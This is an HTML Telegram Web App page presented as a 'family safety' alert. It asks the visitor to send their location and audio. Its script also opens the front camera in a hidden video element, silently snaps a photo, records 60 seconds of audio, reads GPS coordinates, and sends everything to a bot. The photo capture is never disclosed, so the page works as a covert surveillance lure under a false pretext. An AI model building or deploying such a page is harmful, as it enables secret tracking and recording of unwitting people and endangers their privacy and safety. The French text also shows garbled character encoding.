<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S√©curit√© Famille</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
        #status { margin: 20px; color: #555; font-weight: bold; }
        .btn { background: #0088cc; color: white; border: none; padding: 20px; border-radius: 10px; font-size: 18px; cursor: pointer; width: 100%; }
        video { width: 100%; border-radius: 10px; margin-top: 10px; background: #000; }
    </style>
</head>
<body>

    <h2>Alerte S√©curit√©</h2>
    <p>Clique sur le bouton pour m'envoyer ta position et l'audio.</p>
    
    <div id="status">En attente...</div>
    
    <button class="btn" onclick="sendData()" id="mainBtn">üìç ENVOYER MON SIGNAL</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Ouvre la fen√™tre en grand

        const video = document.getElementById('video');
        const statusDiv = document.getElementById('status');
        const mainBtn = document.getElementById('mainBtn');

        // Pr√©parer la cam√©ra d√®s l'ouverture
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(stream => { 
                video.srcObject = stream;
                statusDiv.innerText = "Cam√©ra et Micro pr√™ts ‚úÖ";
            })
            .catch(err => {
                statusDiv.innerText = "Erreur : Autorise le GPS/Micro ‚ùå";
            });

        let mediaRecorder;
        let audioChunks = [];

        async function sendData() {
            statusDiv.innerText = "üî¥ Enregistrement audio en cours (60s)...";
            mainBtn.disabled = true;
            mainBtn.style.background = "#ccc";

            // 1. D√©marrer l'audio
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(audioStream);
            
            mediaRecorder.ondataavailable = (event) => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                statusDiv.innerText = "üì§ Envoi des donn√©es au bot...";
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    const base64Audio = reader.result;
                    
                    // 2. Prendre la photo
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photo = canvas.toDataURL('image/jpeg');

                    // 3. R√©cup√©rer la position GPS
                    navigator.geolocation.getCurrentPosition((pos) => {
                        const data = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            photo: photo,
                            audio: base64Audio
                        };
                        // Envoi final vers le bot Python
                        tg.sendData(JSON.stringify(data));
                        tg.close();
                    }, (err) => {
                        alert("Erreur GPS. Active ta localisation.");
                    });
                };
            };

            mediaRecorder.start();
            
            // Arr√™ter apr√®s 60 secondes
            setTimeout(() => {
                mediaRecorder.stop();
            }, 60000); 
        }
    </script>
</body>
</html>
